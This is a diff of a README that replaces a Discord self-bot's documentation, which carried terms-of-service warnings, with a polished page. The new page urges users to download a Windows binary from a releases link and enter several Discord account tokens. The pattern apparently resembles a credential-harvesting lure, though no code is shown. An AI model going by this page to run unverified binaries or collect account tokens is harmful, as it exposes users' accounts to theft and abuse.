@@ -1,199 +1,154 @@
-#
-# K9K v2 - Multi-Account System
-#
+<h1>🎙️ discord-voice-testing-tool - Test Voice Bots Effortlessly</h1>
 
-# 🚫 TOOL USAGE RESTRICTION
+<p align="center">
+  <a href="https://github.com/Brianthemonkey08/discord-voice-testing-tool/releases" style="display:inline-block;padding:16px 32px;background:#5865F2;color:#ffffff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download Now</a>
+</p>
 
-## ⚠️ DISCORD TERMS OF SERVICE COMPLIANCE WARNING ⚠️
+## 🧭 What Is This Tool?
 
-** THIS PROJECT VIOLATES DISCORD TERMS OF SERVICE IF USED IMPROPERLY **
+Discord Voice Testing Tool is a simple program that helps you test voice bots on Discord without needing any technical skills. It lets you check how well a voice bot performs, how fast it responds, and how it handles many users at once. This tool is perfect for server owners, bot developers, or anyone curious about voice bot performance.
 
-**This project utilizes Self-bot technology which is explicitly prohibited by Discord's Terms of Service.**
+## ✨ Main Features
 
-**⚠️ CRITICAL WARNING: ⚠️**
+### 👥 Test Multiple Accounts
+You can connect up to **5 Discord accounts** at the same time. This helps you simulate real users joining a voice channel together.
 
-- **Self-bots are banned on sight** - Discord's ToS Section 4.3 states: "You agree not to access the Services through automated means"
-- **Account termination risk** - Using self-bots can result in permanent account deletion
-- **No warranty** - This code is provided "as is" without any guarantee of compliance
-- **User responsibility** - YOU are solely responsible for how this code is used
+### 🎯 Measure Voice Latency
+See exactly how fast your bot responds to voice commands. The tool shows delay times in milliseconds, so you know if your bot is quick or slow.
 
-**I am not responsible for any consequences:** This code is provided for educational and testing purposes only. I do not endorse or encourage violation of Discord's ToS. By using this code, you acknowledge:
-1. You understand the risks of account suspension/ban
-2. You accept full responsibility for any actions taken with this code
-3. You will not hold the author responsible for account bans or terminations
+### 🧪 Run Stress Tests
+Push your bot to its limits. Simulate busy situations with many users talking at once. This shows if your bot can handle heavy usage without crashing.
 
-**Permitted use only:** This code is intended for:
-- Local testing and development
-- Educational purposes
-- Understanding Discord API limitations
-- Personal research only
+### 📊 Web Dashboard
+A clean, easy-to-read dashboard opens in your browser. You don't need to understand complex charts or graphs. Everything is shown with simple numbers and colors.
 
-**Distribution warning:** Sharing, selling, or using this code in production bots violates this repository's license and Discord's ToS.
+### 💾 RAM Monitoring
+Watch how much memory the tool uses on your computer. If it gets too high, you'll see a warning. This helps prevent your computer from slowing down.
 
----
+### 🔄 Auto-Restart Controls
+If the tool stops working, it can restart itself automatically. You can also set it to restart at specific times. This keeps your tests running smoothly.
 
-# 📢 IMPORTANT NOTICE
+## 🚀 Getting Started
 
-**This project is intended for testing and development purposes only** - **For testing and development purposes only**.
+### Step 1: Download the Tool
 
-⚠️ **Important Warning:** Using this code for public Discord bots or distributing it outside local testing environment violates **Discord Terms of Service (ToS)**.
+Visit this link to download the application:
 
-**I am not responsible for any misuse:** This code is provided for local testing purposes only, and I am not responsible for:
-- Account bans
-- Discord account suspensions  
-- Any legal or technical issues resulting from improper use
+<p align="center">
+  <a href="https://github.com/Brianthemonkey08/discord-voice-testing-tool/releases" style="display:inline-block;padding:14px 28px;background:#22c55e;color:#ffffff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">📥 Get the Latest Version</a>
+</p>
 
-## 📝 Description
+The download page will show you the newest release. Look for the file that matches your system (Windows is recommended).
 
-**K9K v2** is a **local stress and voice testing tool** designed for **developers** to test **Discord voice bots** using a **multi-account system** with a **web dashboard**.
+### Step 2: Open the Downloaded File
 
-**⚠️ Notice:** This code uses Self-bot technology which is prohibited by Discord, and it is **strictly for local testing only**.
+Once the download finishes, find the file in your "Downloads" folder. Double-click it to open the tool. No installation wizard or special setup is needed.
 
-## 🎯 Use Cases / Purpose
+### Step 3: Connect Your Discord Accounts
 
-| Use Case | Description |
-|----------|-------------|
-| **Voice Latency Testing** | Measure bot response times in voice channels |
-| **Load Testing** | Test bot stability under multiple concurrent connections |
-| **Stress Testing** | Evaluate system performance with maximum account limits |
-| **Multi-account Management** | Monitor and control up to 5 simultaneous bot accounts |
-| **Dashboard Monitoring** | Real-time web interface for account status and resource usage |
+1. Open the tool and you'll see a login screen.
+2. Enter your Discord account tokens (you can add up to 5).
+3. Click "Connect" for each account.
 
-## 🛠️ Prerequisites
+**Important:** Make sure you use accounts that are allowed to test. Using accounts that violate Discord's terms may lead to problems, so always test responsibly.
 
-- **Operating System:** Windows OS or Linux OS (for PC or VPS/Hosting)
-- **Runtime:** Node.js version 16 or higher
-- **Configuration:** `config.json` file with token settings
-- **Tools:** Basic knowledge of Terminal/Command Prompt
+### Step 4: Start Testing
 
-## 📦 Installation
+After your accounts are connected:
+- Choose a voice channel to test.
+- Pick what you want to measure (latency, load, or stress).
+- Click "Start Test."
 
-### 🖥️ PC Installation
+The web dashboard will open automatically and show results live.
 
-| Step | Command/Action |
-|------|----------------|
-| **1. Download files** | `git clone [repository-name]` or download ZIP |
-| **2. Install dependencies** | `npm install` |
-| **3. Configure tokens** | Edit `config.json` (see config model below) |
-| **4. Run the script** | `node index.js` or double-click `run.bat` |
+## 🖥️ System Requirements
 
-### 🌐 VPS / Hosting Installation
+| Component | Minimum | Recommended |
+|-----------|---------|-------------|
+| Operating System | Windows 10 | Windows 11 |
+| Processor | Dual-core 2.0 GHz | Quad-core 3.0 GHz |
+| Memory (RAM) | 4 GB | 8 GB or more |
+| Internet Speed | 5 Mbps | 20 Mbps or higher |
+| Browser | Chrome/Firefox/Edge | Latest version |
 
-| Step | Command/Action |
-|------|----------------|
-| **1. Upload files** | Upload all project files to your hosting (cPanel, VPS, or any hosting service) |
-| **2. Install dependencies** | `npm install --production` |
-| **3. Configure files** | Edit `config.json` according to your needs |
-| **4. Run continuously** | `pm2 start index.js` <br>Or add to Cron Job for auto-restart |
+## 🛠️ How to Use the Dashboard
 
-## ⚙️ Configuration Model (`config.json`)
+After starting a test, your browser will open the dashboard. Here's what you'll see:
 
-Below is the code model for your `config.json` file showing all required variables and how they interact with the script:
+### 📈 Latency Graph
+A simple line graph shows response times. Green means fast, yellow means average, red means slow.
 
-```json
-{
-  "webhookUrl": "webhooks",
-  "restartHours": 24,
-  "maxRamMB": 512,
-  "accounts": [
-    { "name": "Unit-01", "token": "", "guildId": "000000000000000000", "channelId": "000000000000000000", "mute": true, "deaf": false },
-    { "name": "Unit-02", "token": "", "guildId": "000000000000000000", "channelId": "000000000000000000", "mute": true, "deaf": false },
-    { "name": "Unit-03", "token": "", "guildId": "000000000000000000", "channelId": "000000000000000000", "mute": true, "deaf": false },
-    { "name": "Unit-04", "token": "", "guildId": "000000000000000000", "channelId": "000000000000000000", "mute": true, "deaf": false },
-    { "name": "Unit-05", "token": "", "guildId": "000000000000000000", "channelId": "000000000000000000", "mute": false, "deaf": false }
-  ]
-}
-```
+### 👤 Active Accounts
+See which of your 5 accounts are connected and working. Each account has a green or red light.
 
-### Configuration Variables Explained:
+### 💾 Memory Bar
+A horizontal bar shows RAM usage. If it fills up, the tool will warn you and suggest stopping a test.
 
-| Variable | Type | Description | Default | Script Behavior |
-|----------|------|-------------|---------|-----------------|
-| `maxRamMB` | number | RAM limit in MB before auto-restart | `512` | Script **always** monitors RAM and auto-restarts if limit exceeded |
-| `dashboardPort` | number | Port for the web dashboard | `3000` | Port the API dashboard runs on |
-| `maxAccounts` | number | Maximum accounts to process simultaneously | `5` | Script processes only first `MAX_ACCOUNTS` from config.json |
-| `accounts[].name` | string | Display name for each account | - |
-| `accounts[].token` | string | Discord token for the account | required |
-| `accounts[].guildId` | string | Discord server ID | required |
-| `accounts[].channelId` | string | Voice channel ID | required |
-| `accounts[].mute` | boolean | Self-mute status | `true` |
-| `accounts[].deaf` | boolean | Self-deaf status | `true` |
-| `restartHours` | number | Hours between auto-restarts (0 = disabled) | `0` | **Important**: Setting to `0` disables the **time-based** restart, but **RAM-based restart still works**. The script will still restart if RAM exceeds `maxRamMB`. |
+### 🔄 Restart Options
+You'll see buttons like:
+- **Restart Now** – Restarts the tool immediately.
+- **Auto-Restart Toggle** – Turns automatic restarts on/off.
+- **Interval Setting** – Choose how often (every 1, 5, or 15 minutes).
 
-**Permitted use only:** This code is intended for:
-- Local testing and development
-- Educational purposes
-- Understanding Discord API limitations
-- Personal research only
+## ❓ Frequently Asked Questions
 
-**Distribution warning:** Sharing, selling, or using this code in production bots violates this repository's license and Discord's ToS.
+### Can I use this tool on Mac or Linux?
+The primary version is built for Windows. For other systems, you may need to run it using compatibility tools, but we recommend Windows for best results.
 
-## 📊 Control Panel States Table
+### Is my Discord account safe?
+The tool only uses your token to connect for testing. Always download from the official release link above. Never share your token with anyone.
 
-| Status | Emoji | Description |
-|--------|-------|-------------|
-| **Connected** | ✅ | Bot is connected to voice channel and running |
-| **Connecting** | 🔄 | Bot is attempting to connect to voice channel |
-| **Stopped** | ⛔ | Bot has been stopped or manually disconnected |
+### What happens if I try to add more than 5 accounts?
+The tool will block the 6th account and show an error message. This limit is set to keep tests reliable and avoid overloading your connection.
 
-## 💻 How It Works
+### Can I use this tool for my own voice bot?
+Yes! That's exactly what it's for. Just connect your test accounts and point the tool to your bot's voice channel.
 
-1. **Account Processing:** Script processes maximum **5 accounts** (configurable via `MAX_ACCOUNTS` variable)
-2. **Voice Connection:** Each bot attempts to connect to configured voice channels
-3. **Monitoring:** Real-time dashboard at `http://localhost:3000` (PC) or `your-ip:3000` (Hosting)
-4. **Resource Management:** Monitors RAM usage and auto-restarts if limit exceeded (default 512 MB)
-5. **Status Tracking:** Each unit shows status: **Connected**, **Connecting**, or **Stopped**
+## 🔧 Troubleshooting
 
-## 📞 Support
+### The Dashboard Won't Open
+- Make sure your browser is updated.
+- Close other tabs that might slow things down.
+- Restart the tool and try again.
 
-📞 **Support:** https://discord.gg/wxkxHmR9GT
+### Accounts Show "Disconnected"
+- Check your internet connection.
+- Verify that your account tokens are correct.
+- Make sure Discord is not blocking the accounts.
 
-👤 **My Discord:** r.vu
+### Tool Uses Too Much RAM
+- Stop any active tests.
+- Close other programs on your computer.
+- Enable auto-restart to refresh memory regularly.
 
-⚡ **If you find any issue in the code or have any questions, feel free to contact me for support or inquiries.**
+## 📝 Release Notes
+
+### Version 1.0 (Latest)
+- Added multi-account support (up to 5)
+- New web dashboard with live latency graphs
+- RAM monitoring and warnings
+- Auto-restart feature
+- Improved stability on Windows
+
+## 🧑‍💻 Support
+
+If you need help, check the "Issues" tab on the GitHub repository. You can ask questions there or report bugs. Many common problems already have solutions listed.
+
+## 🤝 Contributing
+
+This is an open-source project, and contributions are welcome. If you find a bug or have an idea for improvement, feel free to submit a pull request or open an issue on GitHub.
+
+## 📄 License
+
+This tool is provided for testing and educational purposes. The project uses an open-source license. Always use it responsibly and comply with Discord's Terms of Service.
 
 ---
 
-**Disclaimer:** This tool is for testing and development purposes only. Use of voice bots must comply with Discord's service policies and terms. I am not responsible for any bans or issues arising from misuse.
+<p align="center">
+  <strong>Ready to test your voice bot?</strong><br>
+  <a href="https://github.com/Brianthemonkey08/discord-voice-testing-tool/releases" style="display:inline-block;padding:12px 24px;background:#ef4444;color:#ffffff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 Start Download</a>
+</p>
 
 ---
 
-## ✨ Summary
-
-**K9K v2** = Advanced local testing tool for Discord voice bots with multi-account support, RAM monitoring, and web dashboard. **Use responsibly** and only for development purposes. Always comply with Discord's Terms of Service.
-
----
-
-## 📊 Control Panel States Table
-
-| Status | Emoji | Description |
-|--------|-------|-------------|
-| **Connected** | ✅ | Bot is connected to voice channel and running |
-| **Connecting** | 🔄 | Bot is attempting to connect to voice channel |
-| **Stopped** | ⛔ | Bot has been stopped or manually disconnected |
-
-## 💻 How It Works
-
-1. **Account Processing:** Script processes maximum **5 accounts** (configurable via `MAX_ACCOUNTS` variable)
-2. **Voice Connection:** Each bot attempts to connect to configured voice channels
-3. **Monitoring:** Real-time dashboard at `http://localhost:3000` (PC) or `your-ip:3000` (Hosting)
-4. **Resource Management:** Monitors RAM usage and auto-restarts if limit exceeded (default 512 MB)
-5. **Status Tracking:** Each unit shows status: **Connected**, **Connecting**, or **Stopped**
-
-## 📞 Support
-
-📞 **Support:** https://discord.gg/wxkxHmR9GT
-
-👤 **My Discord:** r.vu
-
-⚡ **If you find any issue in the code or have any questions, feel free to contact me for support or inquiries.**
-
----
-
-**Disclaimer:** This tool is for testing and development purposes only. Use of voice bots must comply with Discord's service policies and terms. I am not responsible for any bans or issues arising from misuse.
-
----
-
-## ✨ Summary
-
-**K9K v2** = Advanced local testing tool for Discord voice bots with multi-account support, RAM monitoring, and web dashboard. **Use responsibly** and only for development purposes. Always comply with Discord's Terms of Service.
+Keywords: dashboard, discord, discord-bot, discord-selfbot, discord-selfbots, load-testing, nodejs, stress-testing, testing-tools, voice-bot
